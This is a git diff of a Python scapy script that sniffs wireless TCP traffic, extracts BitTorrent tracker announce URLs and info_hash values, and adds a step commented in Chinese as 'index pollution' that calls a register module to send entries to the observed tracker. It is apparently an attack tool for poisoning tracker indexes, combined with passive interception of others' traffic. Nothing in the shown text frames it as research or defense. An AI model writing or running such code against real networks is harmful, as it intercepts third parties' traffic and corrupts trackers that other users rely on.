@@ -1,9 +1,14 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 from scapy.all import *
 from lib import decode
+from lib import register
 # 存储会话的ip地址对
 session_dict = {}
 # 存储tracker服务器对应的info_hash
 info_hash_dict = {}
+# 存储tracker服务器对应的url
+url_dict = {}
 
 def pcap_and_analyze():
     pkgs = sniff(iface="wlan0", filter="tcp", count=100, prn=rollback)
@@ -18,11 +23,12 @@ def rollback(pkg):
     if payload is None or length <= 4:
         return
     if payload[:3] == b"GET" and payload[-4:] == b"\r\n\r\n":
-        info_hash = isHttpRequest(payload)
-        print(info_hash)
-        if info_hash:
+        info = isHttpRequest(payload)
+        print(info)
+        if info:
             session_dict[pkg.payload.dst] = pkg.payload.src
-            info_hash_dict[pkg.payload.dst] = info_hash
+            url_dict[pkg.payload.dst] = info[0]
+            info_hash_dict[pkg.payload.dst] = info[1]
     elif pkg.payload.src in session_dict.keys() and session_dict[pkg.payload.src] == pkg.payload.dst:
         response = payload.split(b"\r\n\r\n")
         if len(response) != 2:
@@ -36,6 +42,10 @@ def rollback(pkg):
             print(2)
             return
         print("succeed catch a pkg src is %s and dest is %s" % (pkg.payload.src, pkg.payload.dst))
+        # 开始进行索引污染
+        if pkg.payload.src not in info_hash_dict.keys() or pkg.payload.src not in url_dict.keys():
+            raise EnvironmentError("系统错误")
+        register.get(url_dict[pkg.payload.src], info_hash_dict[pkg.payload.src], 10)
     return
 
 
@@ -54,7 +64,6 @@ def isHttpRequest(payload):
     if len(url) != 2:
         return False
     url, params = url[0], url[1].split('&')
-    # 从url的参数中生成字典
     temp = {}
     for param in params:
         sin = param.split('=')
@@ -69,7 +78,7 @@ def isHttpRequest(payload):
         return False
     if "port" not in param.keys():
         return False
-    return info_hash
+    return  "http://" + host + url, info_hash
 
 if __name__ == "__main__":
     pcap_and_analyze()
